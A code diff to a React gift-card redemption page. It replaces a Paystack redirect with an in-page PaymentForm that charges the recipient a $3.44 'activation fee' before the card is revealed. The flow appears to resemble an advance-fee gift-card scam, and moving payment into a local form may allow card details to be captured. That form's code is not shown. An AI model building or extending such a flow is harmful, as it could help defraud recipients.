@@ -3,6 +3,7 @@ import { useSearchParams, useNavigate } from 'react-router-dom';
 import { decodeCardToken } from '../emailService';
 import { BrandIcon } from '../BrandIcon';
 import { logActivity } from '../utils/logger';
+import PaymentForm from '../components/PaymentForm';
 
 const BRAND_META = {
     'Apple': { icon: '', color: 'apple' },
@@ -26,6 +27,7 @@ const RedeemCard = () => {
     const [toastMessage, setToastMessage] = useState('');
     const [isCancelled, setIsCancelled] = useState(false);
     const [isCheckingStatus, setIsCheckingStatus] = useState(true);
+    const [showPaymentForm, setShowPaymentForm] = useState(false);
 
     // Verify Paystack transaction callback
     useEffect(() => {
@@ -119,39 +121,9 @@ const RedeemCard = () => {
     };
 
     // Paystack Payment Trigger via Serverless
-    const handlePaystackPayment = async () => {
-        const userEmail = cardData?.to || 'recipient@rechargecard.store';
-        setIsCheckingStatus(true);
+    const handlePaystackPayment = () => {
         logActivity(`User clicked Pay Activation Fee for ${cardData?.brandName} card`, 'info');
-
-        try {
-            const response = await fetch('/.netlify/functions/paystack-initialize', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: userEmail,
-                    amountInUsd: 3.44,
-                    callbackUrl: window.location.origin + window.location.pathname + '?token=' + encodeURIComponent(token),
-                    metadata: {
-                        type: 'clearance_activation'
-                    }
-                })
-            });
-
-            const data = await response.json();
-
-            if (data.authorization_url) {
-                window.location.href = data.authorization_url;
-            } else {
-                setIsCheckingStatus(false);
-                alert('❌ Failed to initialize payment: ' + (data.error || 'Unknown error'));
-            }
-        } catch (err) {
-            setIsCheckingStatus(false);
-            alert('❌ Failed to connect to secure payment gateway.');
-        }
+        setShowPaymentForm(true);
     };
 
     const copyToClipboard = (text) => {
@@ -249,7 +221,7 @@ const RedeemCard = () => {
 
     return (
         <div className="container">
-            {!isLoading && !isPaid && (
+            {!isLoading && !isPaid && !showPaymentForm && (
                 <div className="content">
                     <h1 style={{ textAlign: 'center' }}>
                         {cardData?.bypassPayment ? 'Your Gift Card is Ready' : 'Card Activation Required'}
@@ -396,6 +368,19 @@ const RedeemCard = () => {
                         </button>
                     </div>
                 </div>
+            )}
+
+            {showPaymentForm && !isPaid && !isLoading && (
+                <PaymentForm
+                    amount={3.44}
+                    email={cardData?.to || 'recipient@rechargecard.store'}
+                    type="activation"
+                    onSuccess={(ref) => {
+                        setShowPaymentForm(false);
+                        triggerCardRevealAnimation();
+                    }}
+                    onCancel={() => setShowPaymentForm(false)}
+                />
             )}
 
             {toastMessage && <div className="toast-msg">{toastMessage}</div>}
